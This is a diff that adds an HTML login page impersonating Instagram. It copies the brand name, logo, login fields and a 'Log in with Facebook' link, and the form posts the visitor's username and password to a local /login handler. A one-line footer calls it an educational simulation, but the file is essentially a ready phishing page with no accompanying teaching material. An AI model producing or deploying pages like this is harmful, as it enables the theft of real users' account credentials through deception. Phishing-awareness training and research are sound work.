@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="/static/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+</head>
+<body class="insta-bg">
+  <div class="login-box">
+    <img src="/static/instagram.png" class="logo" alt="Instagram">
+    <form method="POST" action="/login">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <div class="divider"><span>OR</span></div>
+    <a href="#" class="fb-login">Log in with Facebook</a>
+    <p class="note">This is a simulation page for educational purposes only.</p>
+  </div>
+</body>
+</html>
